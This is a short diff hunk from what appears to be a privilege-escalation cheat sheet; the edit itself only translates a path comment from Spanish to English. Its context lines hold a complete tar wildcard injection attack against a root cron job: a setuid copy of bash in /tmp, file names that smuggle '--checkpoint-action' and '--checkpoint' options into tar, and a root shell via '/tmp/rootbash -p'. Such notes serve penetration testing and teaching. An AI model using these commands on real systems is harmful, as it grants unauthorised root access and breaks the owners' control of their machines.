@@ -302,7 +302,7 @@ chmod +x ls
 # In directory where cron runs: tar * or tar /path/to/dir/*
 echo 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' > /tmp/root.sh
 chmod +x /tmp/root.sh
-cd /path/donde/cron/hace/tar
+cd /path/where/cron/runs/tar
 echo "" > "--checkpoint-action=exec=sh /tmp/root.sh"
 echo "" > --checkpoint=1
 # Wait for cron execution → /tmp/rootbash -p → root
